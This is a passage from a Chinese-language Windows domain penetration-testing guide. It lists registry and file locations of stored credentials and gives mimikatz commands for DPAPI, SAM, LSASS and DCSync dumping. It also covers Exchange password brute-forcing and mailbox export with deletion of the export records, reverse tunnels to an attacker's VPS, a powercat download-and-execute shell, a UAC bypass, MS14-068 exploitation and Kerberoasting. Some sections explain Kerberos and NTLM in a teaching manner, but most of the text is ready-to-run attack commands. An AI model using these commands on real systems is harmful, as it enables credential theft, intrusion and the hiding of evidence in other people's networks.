<p>Xshell 5</p>
<blockquote>
<p>%userprofile%\Documents\NetSarang\Xshell\Sessions</p>
</blockquote>
<p>Xshell 6</p>
<blockquote>
<p>%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</p>
</blockquote>
<p>WinSCP：</p>
<blockquote>
<p>HKCU\Software\Martin Prikryl\WinSCP 2\Sessions</p>
</blockquote>
<p>VNC:</p>
<p>RealVNC</p>
<blockquote>
<p>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver Password</p>
</blockquote>
<p>TightVNC</p>
<blockquote>
<p>HKEY_CURRENT_USER\Software\TightVNC\Server Value Password or PasswordViewOnly</p>
</blockquote>
<p>TigerVNC</p>
<blockquote>
<p>HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 Password</p>
</blockquote>
<p>UltraVNC</p>
<blockquote>
<p>C:\Program Files\UltraVNC\ultravnc.ini passwd or passwd2</p>
</blockquote>
<h2 id="1-8-DPAPI"><a href="#1-8-DPAPI" class="headerlink" title="1.8 DPAPI"></a>1.8 DPAPI</h2><p>DPAPI，由微软从Windows 2000开始发布，称为Data Protection Application Programming<br>Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数<br>CryptUnprotectData 。</p>
<p>其作用范围包括且不限于：</p>
<p>outlook客户端密码</p>
<p>windows credential凭据</p>
<p>chrome保存的密码凭据</p>
<p>internet explorer密码凭据</p>
<p>DPAPI采用的加密类型为对称加密，存放密钥的文件则被称之为Master Key<br>Files，其路径一般为%APPDATA%\Microsoft\Protect{SID}{GUID}。其中{SID}为用户的安全标识符，{GUID}为主密钥名称。我们可以利用用户的密码/hash或域备份密钥解密主密钥，然后解密被dpapi加密的数据。</p>
<p>相关的介绍如下：</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection">https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection</a></p>
<p>在渗透中，可以利用mimikatz做到自动化的数据解密：</p>
<p>a、解密Chrome密码：</p>
<blockquote>
<p>mimikatz dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Login Data” /unprotect</p>
</blockquote>
<p>b、解密Credential：</p>
<blockquote>
<p>mimikatz vault::cred /patch</p>
</blockquote>
<h2 id="1-9-域信任"><a href="#1-9-域信任" class="headerlink" title="1.9 域信任"></a>1.9 域信任</h2><p>信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p>
<p>查看域信任：</p>
<blockquote>
<p>nltest /domain_trusts</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234658.png" alt="img" data-caption="img" loading="lazy"></p>
<p>上述结果显示child.jumbolab.com和jumbolab.com两个域是双向信任的。</p>
<h2 id="1-10-域传送"><a href="#1-10-域传送" class="headerlink" title="1.10 域传送"></a>1.10 域传送</h2><p>当存在域传送漏洞时，可以获取域名解析记录。当有了解析记录后，也能提高对网络环境的进一步认知，比如www解析的ip段可能在dmz区，mail解析的ip段可能在核心区域等等。</p>
<p>windows：</p>
<blockquote>
<p>nslookup -type=ns domain.com nslookup sserver dns.domain.com ls domain.com</p>
</blockquote>
<p>linux：</p>
<blockquote>
<p>dig <a target="_blank" rel="noopener" href="https://github.com/dns">@dns</a>.domain.com axfr domain.com</p>
</blockquote>
<h2 id="1-11-DNS记录获取"><a href="#1-11-DNS记录获取" class="headerlink" title="1.11 DNS记录获取"></a>1.11 DNS记录获取</h2><p>在网内收集dns记录，可以快速定位一些机器、网站。常用工具有Dnscmd、PowerView。</p>
<p>a、在windows server上，可以使用Dnscmd工具获取dns记录。</p>
<p>获取dns记录：</p>
<blockquote>
<p>Dnscmd . /ZonePrint jumbolab.com</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234705.png" alt="img" data-caption="img" loading="lazy"></p>
<blockquote>
<p>Dnscmd . /EnumRecords jumbolab.com .</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234709.png" alt="img" data-caption="img" loading="lazy"></p>
<p>b、在非windows server机器上，可以使用PowerView获取。</p>
<blockquote>
<p>import-module PowerView.ps1 Get-DNSRecord -ZoneName jumbolab.com</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234713.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="1-12-WIFI"><a href="#1-12-WIFI" class="headerlink" title="1.12 WIFI"></a>1.12 WIFI</h2><p>通过如下命令获取连接过的wifi密码：</p>
<blockquote>
<p>for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan show profiles’) do <a target="_blank" rel="noopener" href="https://github.com/echo">@echo</a> %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</p>
</blockquote>
<h2 id="1-13-GPP"><a href="#1-13-GPP" class="headerlink" title="1.13 GPP"></a>1.13 GPP</h2><p>当分发组策略时，会在域的SYSVOL目录下生成一个gpp配置的xml文件，如果在配置组策略时填入了密码，则其中会存在加密过的账号密码。这些密码，往往都是管理员的密码。</p>
<p>其中xml中的密码是aes加密的，密钥已被微软公开：</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN</a></p>
<p>可以使用相关脚本进行解密，如：</p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p>
<p>域用户登录脚本存在目录也会存在敏感文件：</p>
<blockquote>
<p>\domain\Netlogon</p>
</blockquote>
<h2 id="1-14-Seatbelt"><a href="#1-14-Seatbelt" class="headerlink" title="1.14 Seatbelt"></a>1.14 Seatbelt</h2><p>可以利用Seatbelt工具做一些自动化的信息收集，收集的信息很多，包括不限于google历史记录、用户等等：</p>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201445038.png" alt="img" data-caption="img" loading="lazy"></p>
<p>当有了chrome的访问历史时，就可以知道该用户访问的一些内部站点的域名/IP，可以提高内网资产的摸索效率。</p>
<h2 id="1-15-Bloodhound"><a href="#1-15-Bloodhound" class="headerlink" title="1.15 Bloodhound"></a>1.15 Bloodhound</h2><p>我们可以利用Bloodhound做一些自动化的信息收集，包括用户、计算机、组织架构、最快的攻击途径等。但是自动化也意味着告警，该漏洞做自动化信息收集时，会在内网设备上产生大量的告警，按需使用。</p>
<p>执行：</p>
<blockquote>
<p>SharpHound.exe -c all</p>
</blockquote>
<p>运行完毕会生成一个zip压缩包，名字类似于20200526201154_BloodHound。</p>
<p>导入Bloodhound后可以做可视化分析：</p>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201446338.png" alt="img" data-caption="img" loading="lazy"></p>
<p>比较常用的就是寻找攻击域控的最快途径了：</p>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201446813.png" alt="img" data-caption="img" loading="lazy"></p>
<p>如下图，我们知道，如果拿下hand用户后，就可以获取到域控权限：</p>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201447142.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="1-16-Exchange"><a href="#1-16-Exchange" class="headerlink" title="1.16 Exchange"></a>1.16 Exchange</h2><p>exchange一般都在域内的核心位置上，包括甚至安装在域控服务器上，因此我们需要多多关注exchange的相关漏洞，如果拿下exchange机器，则域控也不远了。</p>
<h3 id="1-16-1-邮箱用户密码爆破"><a href="#1-16-1-邮箱用户密码爆破" class="headerlink" title="1.16.1 邮箱用户密码爆破"></a>1.16.1 邮箱用户密码爆破</h3><p>使用ruler工具对owa接口进行爆破：</p>
<blockquote>
<p>./ruler —domain targetdomain.com brute —users /path/to/user.txt —passwords /path/to/passwords.txt</p>
</blockquote>
<p>ruler工具会自动搜索owa可以爆破的接口，如：</p>
<p><a target="_blank" rel="noopener" href="https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml">https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml</a></p>
<p>其他如ews接口也存在被暴力破解利用的风险：</p>
<p><a target="_blank" rel="noopener" href="https://mail.targetdomain.com/ews">https://mail.targetdomain.com/ews</a></p>
<h3 id="1-16-2-通讯录收集"><a href="#1-16-2-通讯录收集" class="headerlink" title="1.16.2 通讯录收集"></a>1.16.2 通讯录收集</h3><p>在获取一个邮箱账号密码后，可以使用MailSniper收集通讯录，当拿到通讯录后，可以再次利用上述爆破手段继续尝试弱密码，但是记住，密码次数不要太多，很有可能会造成域用户锁定：</p>
<blockquote>
<p>Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -OutFile global-address-list.txt</p>
</blockquote>
<h3 id="1-16-3-信息收集"><a href="#1-16-3-信息收集" class="headerlink" title="1.16.3 信息收集"></a>1.16.3 信息收集</h3><p>当我们拿下exchange服务器后，可以做一些信息收集，包括不限于用户、邮件。</p>
<p>获取所有邮箱用户：</p>
<blockquote>
<p>Get-Mailbox</p>
</blockquote>
<p>导出邮件：</p>
<blockquote>
<p>New-MailboxexportRequest -mailbox username -FilePath (“\localhost\c$\test\username.pst”)</p>
</blockquote>
<p>也可以通过web口导出，登录：</p>
<p><a target="_blank" rel="noopener" href="https://mail.domain.com/ecp/">https://mail.domain.com/ecp/</a></p>
<p>导出后会有记录，用如下命令可以查看：</p>
<blockquote>
<p>Get-MailboxExportRequest</p>
</blockquote>
<p>删除某个导出记录：</p>
<blockquote>
<p>Remove-MailboxExportRequest -Identity ‘username\mailboxexport’ -Confirm:$false</p>
</blockquote>
<h1 id="传输通道"><a href="#传输通道" class="headerlink" title="传输通道"></a>传输通道</h1><p>在做完信息收集后，为了方便进一步内网渗透，一般都会建立一个通道，甚至是多级跳板。</p>
<h2 id="2-1-是否出网"><a href="#2-1-是否出网" class="headerlink" title="2.1 是否出网"></a>2.1 是否出网</h2><p>可以用以下命令判断:</p>
<blockquote>
<p>ping : icmp</p>
<p>curl : http</p>
<p>nslookup : dns</p>
</blockquote>
<h2 id="2-2-netsh"><a href="#2-2-netsh" class="headerlink" title="2.2 netsh"></a>2.2 netsh</h2><p>netsh是windows自带的命令，可以允许修改计算机的网络配置。也可以被拿来做端口转发。</p>
<p>A机器执行如下命令：</p>
<blockquote>
<p>netsh interface portproxy add v4tov4 listenport=5555 connectport=3389 connectaddress=192.168.1.1 protocol=tcp</p>
</blockquote>
<p>B机器访问A机器的5555端口，即是192.168.1.1的3389端口</p>
<h2 id="2-3-ssh"><a href="#2-3-ssh" class="headerlink" title="2.3 ssh"></a>2.3 ssh</h2><p>ssh一般被拿来登录linux机器，也可以拿来做代理和转发。</p>
<p>a、开启socks代理：</p>
<blockquote>
<p>ssh -qTfnN -D 1111 <a href="mailto:root@1.1.1">root@1.1.1</a>.1</p>
</blockquote>
<p>输入1.1.1.1机器密码，本地利用proxychains等类似工具连接本地的1111端口的sock5连接即可代理1.1.1.1的网络。</p>
<p>b、控制A、B机器，A能够访问B，且能出网，B能够访问C，但不能出网，A不能访问C：</p>
<p>A机器执行：</p>
<blockquote>
<p>ssh -CNfg -L 2121:CIP:21 root<a target="_blank" rel="noopener" href="https://github.com/BIP">@BIP</a></p>
</blockquote>
<p>输入BIP机器密码，访问A的2121端口即是访问CIP的21端口。</p>
<p>c、控制A机器，A能够访问B：</p>
<p>A机器执行：</p>
<blockquote>
<p>ssh -CNfg -R 2121:BIP:21 root<a target="_blank" rel="noopener" href="https://github.com/hackervps">@hackervps</a></p>
</blockquote>
<p>输入黑客vps密码，访问黑客vps的2121端口即是访问BIP的21端口。</p>
<h2 id="2-4-reGeorg"><a href="#2-4-reGeorg" class="headerlink" title="2.4 reGeorg"></a>2.4 reGeorg</h2><p>reGeorg是一款开源的socks代理软件，可以解决当机器不出网时，使用http代理进入内网。</p>
<p>根据网站支持的语言，把相应的tunnel.xx传到服务器上，访问tunnel.xx显示“Georg says,<br>‘All seems fine’”，说明基本ok。</p>
<p>本地运行：</p>
<p>python reGeorgSocksProxy.py -p 9999 -u <a target="_blank" rel="noopener" href="http://1.1.1.1:8080/tunnel.xx">http://1.1.1.1:8080/tunnel.xx</a></p>
<p>利用proxychains等类似工具连接本地的9999端口的sock5连接即可代理1.1.1.1的网络。</p>
<h2 id="2-5-EarthWorm"><a href="#2-5-EarthWorm" class="headerlink" title="2.5 EarthWorm"></a>2.5 EarthWorm</h2><p>EarthWorm是一款用于开启SOCKS<br>v5代理服务的工具，基于标准C开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。</p>
<p>a、受害者机器有外网ip并可直接访问：</p>
<p>把ew传到对方服务器上，执行：</p>
<blockquote>
<p>./ew -s ssocksd -l 8888</p>
</blockquote>
<p>现在本地利用proxychains等类似工具连接本地的对方服务器的8888端口的sock5连接即可代理对方的网络。</p>
<p>b、控制A机器，A能够访问B，通过A访问B：</p>
<p>在自己外网服务器上执行：</p>
<blockquote>
<p>./ew -s rcsocks -l 1080 -e 8888</p>
</blockquote>
<p>对方服务器执行：</p>
<blockquote>
<p>./ew -s rssocks -d yourvpsip -e 8888</p>
</blockquote>
<p>利用proxychains等类似工具可通过连接你的外网vps的1080<br>端口的socks5，即可代理受害者服务器的网络。</p>
<p>c、控制A、B机器，A能够访问B，B能够访问C，A有外网ip并可直接访问，通过A来使用B的流量访问C：</p>
<p>B机器执行：</p>
<blockquote>
<p>./ew -s ssocksd -l 9999</p>
</blockquote>
<p>A机器：</p>
<blockquote>
<p>./ew -s lcx_tran -l 1080 -f BIP -g 9999</p>
</blockquote>
<p>利用proxychains等类似工具可通过连接A的1080 端口的socks5，即可代理B服务器的网络。</p>
<p>d、控制A、B机器，A能够访问B，B能够访问C，A没有外网ip，通过A连接自己的外网vps来使用B的流量访问C：</p>
<p>自己vps执行：</p>
<blockquote>
<p>./ew -s lcx_listen -l 1080 -e 8888</p>
</blockquote>
<p>B机器执行：</p>
<blockquote>
<p>./ew -s ssocksd -l 9999</p>
</blockquote>
<p>A机器执行：</p>
<blockquote>
<p>./ew -s lcx_slave -d vpsip -e 8888 -f BIP -g 9999</p>
</blockquote>
<p>利用proxychains等类似工具可通过连接你自己的vps的1080<br>端口的socks5，即可代理B服务器的网络。</p>
<h2 id="2-6-lcx"><a href="#2-6-lcx" class="headerlink" title="2.6 lcx"></a>2.6 lcx</h2><p>lcx是一款轻便的端口转发工具。</p>
<p>a、反向转发</p>
<p>外网VPS机器监听：</p>
<blockquote>
<p>lcx.exe -listen 1111 2222</p>
</blockquote>
<p>受害者机器执行：</p>
<blockquote>
<p>lcx.exe -slave VPSip 1111 127.0.0.1 3389</p>
</blockquote>
<p>连接外网VPS机器的2222端口即是连接受害者机器的3389。</p>
<p>b、正向转发</p>
<p>A机器执行：</p>
<blockquote>
<p>lcx.exe -tran 1111 2.2.2.2 8080</p>
</blockquote>
<p>访问A机器的1111端口即是访问2.2.2.2的8080端口。</p>
<h2 id="2-7-powercat"><a href="#2-7-powercat" class="headerlink" title="2.7 powercat"></a>2.7 powercat</h2><p>powercat是一款ps版nc。可以本地执行，也可以远程下载执行，远程执行命令如下：</p>
<blockquote>
<p>powershell “IEX (New-Object<br>System.Net.Webclient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat</a><br>-l -p 8000 -e cmd”</p>
</blockquote>
<p>然后远程连接执行命令即可。如果嫌弃该命令太暴露，可以对其进行编码。</p>
<h2 id="2-8-mssql"><a href="#2-8-mssql" class="headerlink" title="2.8 mssql"></a>2.8 mssql</h2><p>当目标机器只开放mssql时，我们也可以利用mssql执行clr作为传输通道。</p>
<p>环境如下：</p>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201447687.png" alt="img" data-caption="img" loading="lazy"></p>
<p>工具项目地址：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/blackarrowsec/mssqlproxy">https://github.com/blackarrowsec/mssqlproxy</a></p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>明明是administrator权限，为什么有些命令执行不了？拿到一个普通的域用户权限后，如何拿到域控权限？继续往下看。</p>
<h2 id="3-1-UAC"><a href="#3-1-UAC" class="headerlink" title="3.1 UAC"></a>3.1 UAC</h2><p>UAC，即用户账户控制，其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序损坏系统的效果。在系统上直观看起来类似于这样：</p>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234839.png" alt="img" data-caption="img" loading="lazy"></p>
<p>那如何寻找bypass<br>uac的方法呢。我们可以找一些以高权限运行的，但是并没有uac提示的进程，然后利用ProcessMonitor寻找他启动调用却缺失的如dll、注册表键值，然后我们添加对应的值达到bypass<br>uac的效果。</p>
<p>以高权限运行的进程图标一般有如下标志：</p>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234847.png" alt="img" data-caption="img" loading="lazy"></p>
<p>我们win10以ComputerDefaults.exe作为bypass案例，ComputerDefaults.exe进程图标确实有个uac的标志（然后你双击打开会发现并没有uac提醒），</p>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234852.png" alt="img" data-caption="img" loading="lazy"></p>
<p>我们利用ProcessMonitor对该进程的行为做一个监听：</p>
<p>先寻找HKCU:\Software\Classes\ms-settings\Shell\Open\Command<br>注册表，然后发现键值不存在，再寻找HKCR:\ms-settings\Shell\Open\Command\DelegateExecute</p>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234856.png" alt="img" data-caption="img" loading="lazy"></p>
<p>因此当我们修改hkcu注册表后，运行ComputerDefaults.exe就会得到一个bypass<br>uac后的cmd：</p>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234916.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234923.png" alt="img" data-caption="img" loading="lazy"></p>
<p>对了，当修改HKCU\Software\Classes\下的键值时，会同步修改HKCR下面的键值。</p>
<h2 id="3-2-ms14-068"><a href="#3-2-ms14-068" class="headerlink" title="3.2 ms14-068"></a>3.2 ms14-068</h2><p>该漏洞可以在只有一个普通域用户的权限时，获取到域控权限。微软已经修复了该漏洞，对应的补丁号为kb3011780。下面介绍下漏洞的成因，先来一个Kerberos协议流程图：</p>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234926.png" alt="img" data-caption="img" loading="lazy"></p>
<p>图片来源：<a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1515">https://adsecurity.org/?p=1515</a></p>
<p>大致流程如下：</p>
<p>1、域用户登录时，向KDC的AS服务以自身密码加密的时间戳进行预认证；</p>
<p>2、域控的AS服务验证用户的密码是否正确。验证通过后，返回给用户一张TGT票据，该票据为krbtgt密码加密而成；</p>
<p>3、域用户拿着TGT向KDC的TGS服务申请访问Application Server的票据</p>
<p>4、域控的TGS服务验证TGT通过后，返回给域用户能够访问Application<br>Server的票据，即ST，ST以Application Server的服务账号密码加密；</p>
<p>5、域用户拿着ST访问对应的Application Server；</p>
<p>6、Application Server验证ST，决定成功与否。</p>
<p>下面简述ms14-068的问题所在：</p>
<p>TGT中作为用户凭证，包含了用户名、用户id、所属组等信息，即PAC。简单点讲，PAC就是验证用户所拥有权限的特权属性证书。</p>
<p>默认PAC是包含在TGT中的，而出现ms14-068这个问题的原因在于用户在申请TGT时可以要求KDC返回的TGT不包含PAC（include-PAC为false），然后用户自己构造PAC并放入TGS_REQ数据包中的REQ_BODY中，KDC会解密PAC并加密到一个新的TGT中（正常应该返回一个ST）并返回给用户，此时这个TGT已经带入了我们构造的恶意的PAC。后面就是正常的kerberos流程了。</p>
<p>利用方法：</p>
<blockquote>
<p>python ms14-068.py -u @\ -s \ -d \ mimikatz.exe “kerberos::ptc <a href="mailto:TGT_user@domain.ccache">TGT_user@domain.ccache</a>” exit</p>
</blockquote>
<p>也可以使用goldenPac.py来达到ms14-068+psexec的自动化利用：</p>
<blockquote>
<p>goldenPac.py domain.com/username:<a href="mailto:password@dc.domain.com">password@dc.domain.com</a></p>
</blockquote>
<h1 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h1><p>密码抓取已经成为渗透中必不可少的一项技能。一个管理员很可能管理着N多台机器，但是密码使用的都是同一个或者是有规律的。如果抓到一台机器的密码，利用同密码碰撞，很可能这个渗透项目就结束了。本节主要介绍密码抓取的原理和一些手段。</p>
<h2 id="4-1-ntlmhash和net-ntlmhash"><a href="#4-1-ntlmhash和net-ntlmhash" class="headerlink" title="4.1 ntlmhash和net-ntlmhash"></a>4.1 ntlmhash和net-ntlmhash</h2><p>先简单介绍下lmhash和ntlmhash。</p>
<p>我们经常看到的hash长这样：</p>
<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
<p>他的组成就是:</p>
<p>user:sid:lmhash:ntlmhash</p>
<p>lmhash的加密流程如下：</p>
<p>1、密码长度限制为14个字符</p>
<p>2、密码全部转换为大写</p>
<p>3、密码转换为16进制字符串，不足14字节用0补全</p>
<p>4、密码的16进制字符串被分成两个7byte部分</p>
<p>5、再分7bit为一组,每组末尾加0，再组成一组</p>
<p>6、上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。</p>
<p>7、将加密后的两组拼接在一起，得到最终LM HASH值。</p>
<p>为了解决lmhash强度不够的问题，微软推出了ntlmhash：</p>
<p>1、先将用户密码转换为十六进制格式。</p>
<p>2、将十六进制格式的密码进行Unicode编码。</p>
<p>3、使用MD4对Unicode编码数据进行Hash计算</p>
<p>因为在vista后不再支持lmhash，因此抓到的hash中的lmhash都是aad3b435b51404eeaad3b435b51404ee</p>
<p>在hash传递攻击时，可以替换成0：</p>
<p>00000000000000000000000000000000</p>
<p>再看下ntlm认证的过程：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/e172a5823898eb1018b040d59e29e25d.png" alt="img" data-caption="img" loading="lazy"></p>
<p>他的简述流程如下：</p>
<p>1、客户端向服务端发起认证</p>
<p>2、服务器收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。并使用登录用户密码hash加密Challenge，获得Challenge1</p>
<p>3、客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器</p>
<p>4、服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功。</p>
<p>上述中的response类似于下面这样：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/d8a95b481322d26b6404eb104a986489.png" alt="img" data-caption="img" loading="lazy"></p>
<p>上述中的response就可以理解为net-ntlmhash，因此ntlmhash我们是可以拿来hash传递的，而net-ntlmhash不可以，但是net-ntlmhash也可以拿来做破解和relay。</p>
<h2 id="4-2-本地用户凭据"><a href="#4-2-本地用户凭据" class="headerlink" title="4.2 本地用户凭据"></a>4.2 本地用户凭据</h2><p>在windows上，C:\Windows\System32\config目录保存着当前用户的密码hash。我们可以使用相关手段获取该hash。</p>
<p>使用reg命令获取本地用户凭据hash：</p>
<blockquote>
<p>reg save hklm\sam sam.hive reg save hklm\system system.hive reg save hklm\security security.hive</p>
</blockquote>
<p>最后利用bootkey解密获取hash。</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/f58ea1fcbb2887c85f5ca0ef19afad78.png" alt="img" data-caption="img" loading="lazy"></p>
<p>其他一些工具同理，比如</p>
<p>pwdump7:</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/4aa431618abb0a134633c4478ebbd065.png" alt="img" data-caption="img" loading="lazy"></p>
<p>mimikatz：</p>
<blockquote>
<p>privilege::debug token::elevate lsadump::sam</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/c94df54ea7f267bdc9ad1e630b2afd01.png" alt="img" data-caption="img" loading="lazy"></p>
<p>当然，从lsass.exe中获取也可以。如直接使用mimikatz获取：</p>
<blockquote>
<p>privilege::debug sekurlsa::logonpasswords</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/9860d564a3088cc30ea3c7d885ef978a.png" alt="img" data-caption="img" loading="lazy"></p>
<p>Procdump+Mimikatz：</p>
<blockquote>
<p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp mimikatz.exe “sekurlsa::minidump lsass.dmp”<br>“sekurlsa::logonPasswords full” exit</p>
</blockquote>
<p>而为什么有的抓不到明文密码，主要还是kb2871997的问题。kb2871997补丁会删除除了wdigest<br>ssp以外其他ssp的明文凭据，但对于wdigest<br>ssp只能选择禁用。用户可以选择将HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential更改为0来禁用。</p>
<p>它在winserver 2012 R2及以上版本已默认集成。在winserver 2012<br>R2上面测试，手动添加上述注册表的值为1，然后抓密码，发现只有wdigest能抓到明文密码了：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/b246443a08bdf28f551a42b10b36da01.png" alt="img" data-caption="img" loading="lazy"></p>
<p>再提一下kb2871997补丁问题，除了“解决”上述明文密码问题，还“解决”了pth问题，但是kb2871997对于本地Administrator(rid为500，操作系统只认rid不认用户名)和本地管理员组的域用户是没有影响的。</p>
<h2 id="4-3-域hash"><a href="#4-3-域hash" class="headerlink" title="4.3 域hash"></a>4.3 域hash</h2><p>当拿到域控权限时，可以从域控中的C:\Windows\NTDS\NTDS.dit导出所有用户hash。因为ntds.dit被占用，因此需要利用如卷影备份等手段copy出ntds.dit，然后利用如NTDSDumpEx.exe解析hash：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/6d4ee836d657a5b869ec62350ea5db6e.png" alt="img" data-caption="img" loading="lazy"></p>
<p>当拷贝ntds.dit时，由于网络、文件大小等问题，可以使用DRS协议获取hash凭据：</p>
<blockquote>
<p>mimikatz.exe privilege::debug “lsadump::dcsync /domain:jumbolab.com /all /csv” exit</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/0d47d757603d136edc40bcfc86f68d63.png" alt="img" data-caption="img" loading="lazy"></p>
<p>有时为什么能抓到明文密码，有时并不能呢，除了上面说的kb2871997的问题以外，还有个“Reversible<br>Encryption”。</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/aba621a5087928fc185117ffb661a9a6.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="4-4-token窃取"><a href="#4-4-token窃取" class="headerlink" title="4.4 token窃取"></a>4.4 token窃取</h2><p>token是一个描述进程或线程安全上下文的对象。token即令牌包括了与进程或线程关联的用户账号的标识和特权，当用户登录时，系统通过将用户密码与安全数据库进行比对来验证用户密码正确性，如果密码正确，系统将生成访问token。该用户的进程都携带该token，可以利用DuplicateTokenEx<br>api对现有token的复制，然后使用CreateProcessWithToken<br>api对复制的token创建一个新的进程。效果如下：</p>
<p>有个system权限进程：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/e1ebc9e7044af895de18b19030551932.png" alt="img" data-caption="img" loading="lazy"></p>
<p>以administrator权限窃取该进程token，成功获取system权限：</p>
<p><img data-fancybox="gallery" src="https://security.tencent.com/uploadimg_dir/blog/154/2ef4ec750e6b8a183f230b97e93e9217.png" alt="img" data-caption="img" loading="lazy"></p>
<p>当然，降权也可以使用上述方法。</p>
<h2 id="4-5-Kerberoasting"><a href="#4-5-Kerberoasting" class="headerlink" title="4.5 Kerberoasting"></a>4.5 Kerberoasting</h2><p>在KRB_TGS_REP中，TGS会返回给Client一张票据ST，而ST是由Client请求的Server端密码进行加密的。当Kerberos协议设置票据为RC4方式加密时，我们就可以通过爆破在Client端获取的票据ST，从而获得Server端的密码。</p>
<p>在上述SPN信息收集中得到一个域用户test注册了一个SPN，我们请求TGS：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">powershell<span class="hljs-variable">$SPNName</span> = <span class="hljs-string">&#x27;test/test&#x27;</span>Add-Type -AssemblyNAme System<span class="hljs-selector-class">.IdentityModelNew-Object</span> System<span class="hljs-selector-class">.IdentityModel</span><span class="hljs-selector-class">.Tokens</span><span class="hljs-selector-class">.KerberosRequestorSecurityToken</span> -ArgumentList <span class="hljs-variable">$SPNName</span><br></code></pre></td></tr></table></figure>
